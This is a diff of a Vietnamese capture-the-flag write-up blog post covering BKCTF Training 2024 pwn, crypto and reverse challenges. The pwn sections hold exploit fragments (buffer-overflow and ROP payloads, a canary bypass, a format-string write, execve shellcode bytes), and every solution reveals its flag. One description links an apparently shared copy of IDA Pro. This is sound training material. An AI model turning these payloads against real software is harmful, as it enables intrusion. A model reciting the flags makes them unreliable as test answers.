@@ -1,46 +1,37 @@
 ---
 layout: post
-title:  BKCTF Training 2024
+title:  BKCTF Training 2024 (Vietnamese)
 comments: true
 ---
 
 ## Table of Content
-- [0x00 Hello](#hello)
-- [0x01 Pwnable](#pwnable)
-    * [Bài 1. Buffalow](#bài-1-buffalow)
-    * [Bài 2. index_1](#bài-2-index_1)
-    * [Bài 3. int_1](#bài-3-int_1)
-    * [Bài 4. Rộp Rộp Rộp](#bài-4-rộp-rộp-rộp)
-    * [Bài 5. pwn3](#bài-5-pwn3)
-    * [Bài 6. Raising the hero](#bài-6-raising-the-hero)
-    * [Bài 7. shell_1](#bài-7-shell_1)
-- [0x02 Crypto](#crypto)
-    * [Bài 1. B64 Recovery](#bài-1-b64-recovery)
-- [0x03 Reverse](#reverse)
-    * [Bài 1. Baby IDA 1](#bài-1-baby-ida-1)
-    * [Bài 2. BabyRust](#bài-2-babyrust)
-    * [Bài 3. babylua](#bài-3-babylua)
+- [pwn/Buffalow](#pwnbuffalow)
+- [pwn/index_1](#pwnindex_1)
+- [pwn/int_1](#pwnint_1)
+- [pwn/Rộp Rộp Rộp](#pwnrộp-rộp-rộp)
+- [pwn/pwn3](#pwnpwn3)
+- [pwn/Raising the hero](#pwnraising-the-hero)
+- [pwn/shell_1](#pwnshell_1)
+- [crypto/B64 Recovery](#cryptob64-recovery)
+- [reverse/Baby IDA 1](#reversebaby-ida-1)
+- [reverse/BabyRust](#reversebabyrust)
+- [reverse/babylua](#reversebabylua)
     
-## Hello
-
 {:refdef: style="text-align: center;"}
   ![Smile](/images/bktrain2024/imagee.png)  
 {: refdef}
 
 Đã từ lâu, mình không viết bài ctf mới trên blog, một phần vì chưa có chủ đề nào mình cảm thấy thú vị để viết, phần còn lại là do quỹ thời gian của mình gần đây không có nhiều. Khởi động năm mới 2024 với giải training của trường ĐHBKHN, độ khó của các bài chỉ ở tầm dễ, trung bình, vì vậy mình cũng thoải mái để giải quyết các vấn đề hơn :v:
 
-## Pwnable 
+## pwn/Buffalow
+- Attachments:
+    - [bof_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EjgKHLBXohRNvbwqrXUKTNcBKFnnv3xdBvtaJmzpW9mFPg?e=xnW5Oe)
+    - [bof_1.c](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EjgKHLBXohRNvbwqrXUKTNcBKFnnv3xdBvtaJmzpW9mFPg?e=xnW5Oe)
 
-### Bài 1. Buffalow
+### Description
+Tràn là không tốt nên có lẽ bạn sẽ cần thứ này: [Buffer Overflow Tutorial](https://pwn.guide/free/buffer-overflow)
 
-**Description**
-> Tràn là không tốt nên có lẽ bạn sẽ cần thứ này: [Buffer Overflow Tutorial](https://pwn.guide/free/buffer-overflow)
-
-**Files provided**
-- [bof_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EjgKHLBXohRNvbwqrXUKTNcBKFnnv3xdBvtaJmzpW9mFPg?e=xnW5Oe)
-- [bof_1.c](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EjgKHLBXohRNvbwqrXUKTNcBKFnnv3xdBvtaJmzpW9mFPg?e=xnW5Oe)
-
-**Solution**
+### Solution
 
 Đề bài cho chúng ta source code, đây là một bài BOF cơ bản 
 ```c
@@ -89,12 +80,11 @@ p.interactive()
 
 :triangular_flag_on_post: **BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}**
 
-### Bài 2. index_1
+## pwn/index_1
+- Attachment:
+    - [index_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EiNLxoZtFbFDo11OpZeC3-MBxei6zSW31yC9cRX_YSq2lw?e=uUdUgy)
 
-**Files provided**
-- [index_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EiNLxoZtFbFDo11OpZeC3-MBxei6zSW31yC9cRX_YSq2lw?e=uUdUgy)
-
-**Solution**
+### Solution
 
 Đây là một chương trình mua bán các vật phẩm. Với dạng bài này, các lỗ hổng như chuyển tiền âm, mua số lượng sản phẩm âm, ... rất dễ xảy ra nếu không được kiểm tra kỹ càng. 
 
@@ -136,12 +126,12 @@ Với đoạn code này, khi mua vật phẩm, số tiền chúng ta sẽ bị t
 
 :triangular_flag_on_post: **BKSEC{YOU_SHOULD_buY_f1A9_iN5TE4d_0F_p@PC@i1}**
 
-### Bài 3. int_1
+## pwn/int_1
 
-**Files provided**
-- [int_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EihwCKAH_QVAk1e_7MqT0_gBuSiTtYSlJY2h-FR6aK47dg?e=cBC0uF)
+- Attachment:
+    - [int_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EihwCKAH_QVAk1e_7MqT0_gBuSiTtYSlJY2h-FR6aK47dg?e=cBC0uF)
 
-**Solution**
+### Solution
 
 Load file vào IDA, ta thấy chương trình cho nhập 2 số nguyên dương. Nếu tổng của chúng < 0, ta sẽ có được shell. Đây là lỗ hổng IOF (tràn số nguyên), ta chỉ cần nhập max giá trị của kiểu dữ liệu int cho số đầu tiên và số còn lại với giá trị nguyên dương bất kỳ. 
 
@@ -157,21 +147,21 @@ p.sendlineafter(b'number: ', b'2147483647')
 p.sendlineafter(b'number: ', b'10')
 
 p.interactive()
+# BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}
 ```
 
-:triangular_flag_on_post: **BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}**
+## pwn/Rộp Rộp Rộp
 
-### Bài 4. Rộp Rộp Rộp
+- Author: Spid3r
+- Attachment:
+    - [bof_2](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/En3PdzP5jqtBoVZLIXZRzy8BtCq0kFAlsTVIgrumErKm0Q?e=xhR7eA)
 
-**Description**
-> Nói đến Buffer Overflow không thể nào bỏ qua được ROP Attack (Return-oriented programming), các pwner hãy thử khai thác\
-> Keyword: ROP, Gadgets, RET\
-> Author: Spid3r
+### Description
+Nói đến Buffer Overflow không thể nào bỏ qua được ROP Attack (Return-oriented programming), các pwner hãy thử khai thác.
 
-**Files provided**
-- [bof_2](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/En3PdzP5jqtBoVZLIXZRzy8BtCq0kFAlsTVIgrumErKm0Q?e=xhR7eA)
+Keyword: ROP, Gadgets, RET
 
-**Solution**
+### Solution
 
 Load file đã cho vào IDA, ta thấy được lỗ hổng ở hàm `fgets()` với việc cho phép nhập 0x100 bytes cho mảng `buf` có kích thước 8 bytes. (Ở đây mình không chắc `buf` có kích thước 8 bytes vì IDA phân tích ra như vậy. Nhưng mình chắc chắn có lỗi BOF do `buf` được bắt đầu từ [rbp-0x40])
 
@@ -214,16 +204,15 @@ payload = b'x'*0x48 + p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF) + p64(pop_rsi) + p6
 p.sendlineafter(b'number: ', payload)
 
 p.interactive()
+# BKSEC{2-->\\xupgrade\\xBuffer\\xOv3rfl0w\\x1s\\xn0t\\xchiLL\\xhixxxxxxxxxxxxxx}
 ```
 
-:triangular_flag_on_post: **BKSEC{2-->\\xupgrade\\xBuffer\\xOv3rfl0w\\x1s\\xn0t\\xchiLL\\xhixxxxxxxxxxxxxx}**
+## pwn/pwn3
 
-### Bài 5. pwn3
+- Attachment:
+    - [bof_3](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EgLIMROmAZpPpl08MByQ7oUBO-fAEMqn7hP7NaD0KMU9vQ?e=nIEJ1x)
 
-**Files provided**
-- [bof_3](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EgLIMROmAZpPpl08MByQ7oUBO-fAEMqn7hP7NaD0KMU9vQ?e=nIEJ1x)
-
-**Solution**
+### Solution
 
 Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật. 
 
@@ -247,21 +236,19 @@ payload = b'x'*0x58 + p64(canary) + p64(0) + p64(pop_rdi) + p64(0xDEADBEEFDEADBE
 p.sendlineafter(b'number: ', payload)
 
 p.interactive()
+# BKSEC{W3_4LL_Hat3_c4NARY}
 ```
 
-:triangular_flag_on_post: **BKSEC{W3_4LL_Hat3_c4NARY}**
+## pwn/Raising the hero
 
-### Bài 6. Raising the hero
+- Author: Gr4ss
+- Attachment:
+    - [fmt_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/ErD6ygO9r1dDnAHi2aVPijsBiKbKvPngcmBR70iRiU3xnw?e=JZi3kE)
 
-**Description**
-> **doraзmoon** is a very strong knight. But he lost his most important sword.\
-> Please help him find it again.\
-> Author: Gr4ss
+### Description
+**doraзmoon** is a very strong knight. But he lost his most important sword. Please help him find it again.
 
-**Files provided**
-- [fmt_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/ErD6ygO9r1dDnAHi2aVPijsBiKbKvPngcmBR70iRiU3xnw?e=JZi3kE)
-
-**Solution**
+### Solution
 
 Kiểm tra các lớp bảo vệ của file 
 >   Canary                        : ✓
@@ -295,23 +282,22 @@ payload += p32(target + 2)
 p.sendlineafter(b'say?\n', payload)
 
 p.interactive()
+# BKSEC{R41s1ng_th3_H3rO}
 ```
 
 Phân tích một chút về lời giải trên. Do PIE tắt nên địa chỉ biến `target` không thay đổi. Chúng ta cần quan sát và đếm trên stack để biết được chính xác vị trí của `target`. 
 
 Để gán cho `target = 0x6F726568`, ta phải chia ra làm 2 phần, vì khi truyền 0x6F726568 kí tự cho `target` thì sẽ quá lâu. Vì vậy, ta sẽ gán 0x6568 cho `target` và 0x6F72 cho `target+2`. Lưu ý rằng, `$n` đếm số byte ở trước đó được ghi, vậy nên khi gán giá trị cho `target+2`, chúng ta chỉ cần gán 0x6F72 - 0x6568 (bytes) mà thôi. 
 
-:triangular_flag_on_post: **BKSEC{R41s1ng_th3_H3rO}**
-
-**Tham khảo:**
+### Reference: 
 - [Bài 16: Format String - Ghi dữ liệu bằng %n](https://www.youtube.com/watch?v=uet1ixUN8Gg)
 
-### Bài 7. shell_1
+## pwn/shell_1
 
-**Files provided**
-- [shell_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EhzasKiEe6FFoZ6yh4QVOZkBaBORaAdJcWVKC-NWOnUXPg?e=8u2Jic)
+- Attachment:
+    - [shell_1](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EhzasKiEe6FFoZ6yh4QVOZkBaBORaAdJcWVKC-NWOnUXPg?e=8u2Jic)
 
-**Solution**
+### Solution
 
 Load file vào IDA, yêu cầu bài này chỉ là viết shellcode đơn giản 
 
@@ -328,21 +314,19 @@ payload = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73
 p.sendlineafter(b'(max 256 bytes):\n', payload)
 
 p.interactive()
+# BKSEC{ju$7_A_5imPLE_ShelLCODE}
 ```
-:triangular_flag_on_post: **BKSEC{ju$7_A_5imPLE_ShelLCODE}**
 
-## Crypto 
+## crypto/B64 Recovery
 
-### Bài 1. B64 Recovery
+- Author: huud4t
+- Attachment:
+    - [chall.py](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/ElsG5G7KpHxPk75ke4bGoNcBUIU4R5XVUAR5QVp__2zKtA?e=Q7B2zI)
 
-**Description**
-> Show me what you know about Base64?\
-> Author: huud4t
+### Description
+Show me what you know about Base64?\
 
-**Files provided**
-- [chall.py](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/ElsG5G7KpHxPk75ke4bGoNcBUIU4R5XVUAR5QVp__2zKtA?e=Q7B2zI)
-
-**Solution**
+### Solution
 
 Đề bài cho chúng ta source code như sau 
 
@@ -472,23 +456,20 @@ for c in encoded:
 print(base64.b64decode(decoded))
 
 p.interactive()
+# BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}
 ```
 
-:triangular_flag_on_post: **BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}**
+## reverse/Baby IDA 1 
 
-## Reverse 
-
-### Bài 1. Baby IDA 1 
-
-**Description**
-> Để bước chân vào con đường làm Reverser chân chính bạn cần điều gì:
+### Description
+Để bước chân vào con đường làm Reverser chân chính bạn cần điều gì:
 1. [IDA Pro của Spid3r](https://drive.google.com/drive/folders/16ZT_dzf7bGsFPW0jsBmsDoLakXNutCho?usp=sharing) (Bản nào cũng đều chill cả nhé)
 2. Lòng dũng cảm sử dụng file này trên máy thật của bạn
 
-**Files provided**
-- [chall.exe](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EndYd8HMJsdBqq10J_mi9-cBflnnISxiDN6l_EK2XDvZag?e=L2eiAJ)
+- Attachment:
+    - [chall.exe](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EndYd8HMJsdBqq10J_mi9-cBflnnISxiDN6l_EK2XDvZag?e=L2eiAJ)
 
-**Solution**
+### Solution
 
 Chương trình đơn thuần chỉ kiểm tra 2 input chúng ta nhập vào: 
 - input1 = `BKSEC{rev3r5e_r@t`
@@ -497,19 +478,16 @@ Chương trình đơn thuần chỉ kiểm tra 2 input chúng ta nhập vào:
 ```python
 flag = "BKSEC{rev3r5e_r@t" + "})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_"[::-1]
 print(flag)
+# BKSEC{rev3r5e_r@t_lA_vU1_lu0n_hehe}chU@_h3t_DaU_987g432t24678321)}
 ```
 
-:triangular_flag_on_post: **BKSEC{rev3r5e_r@t_lA_vU1_lu0n_hehe}chU@_h3t_DaU_987g432t24678321)}**
+## reverse/BabyRust
 
-### Bài 2. BabyRust
+- Author: shynt_
+- Attachment:
+    - [rust0](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EvAzVM_iQYlNvNwfPPgfdbYBmdGMU3L4oi637ZTgsjxMZQ?e=LDyXKN)
 
-**Description**
-> Author: shynt_
-
-**Files provided**
-- [rust0](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EvAzVM_iQYlNvNwfPPgfdbYBmdGMU3L4oi637ZTgsjxMZQ?e=LDyXKN)
-
-**Solution**
+### Solution
 
 Chương trình yêu cầu phải nhập đúng password. Trace ngược lại từ message **"Wrong! Please try again"**, chúng ta thấy chương trình có gọi hàm `chall::check::h428e27b3168ba563()`. Khi phân tích hàm này, dễ thấy hàm chỉ kiểm tra từng ký tự với các giá trị đã cho trước. 
 
@@ -538,23 +516,22 @@ flag[1] = 0x4B
 flag[0xB] = 0x6D
 
 print("".join([chr(i) for i in flag]))
+# BKSEC{w3lC0mE_tO_R3v}
 ```
 
-:triangular_flag_on_post: **BKSEC{w3lC0mE_tO_R3v}**
+## reverse/babylua
 
-### Bài 3. babylua
+- Author: Hwi
+- Attachments:
+    - [flag.lua](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/Eq3F5H6Fhf1OubkBs7rNResBy-eI29obz86kP0dNhDK97Q?e=WJwogY)
+    - [main.lua](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/Eq3F5H6Fhf1OubkBs7rNResBy-eI29obz86kP0dNhDK97Q?e=WJwogY)
 
-**Description**
-> Here is a lightweight sibling to Python. Reading the code probably just be as eas- oh wait... what is it precompiled for??\
-> Author: Hwi
+### Description
+Here is a lightweight sibling to Python. Reading the code probably just be as eas- oh wait... what is it precompiled for??
 
-**Files provided**
-- [flag.lua](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/Eq3F5H6Fhf1OubkBs7rNResBy-eI29obz86kP0dNhDK97Q?e=WJwogY)
-- [main.lua](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/Eq3F5H6Fhf1OubkBs7rNResBy-eI29obz86kP0dNhDK97Q?e=WJwogY)
+### Solution
 
-**Solution**
-
-Mình đã từng xem qua một số dạng bài về `lua`. Quan sát source code file `main.lua` 
+Quan sát source code file `main.lua` 
 ```lua
 local ret = require("flag")
 
@@ -622,6 +599,5 @@ for i in range(len(ans)):
         flag += chr(k)
 
 print(flag)
+# BKSEC{ju$t_h@rd3r_2_re@d_:P}
 ```
-
-:triangular_flag_on_post: **BKSEC{ju$t_h@rd3r_2_re@d_:P}**
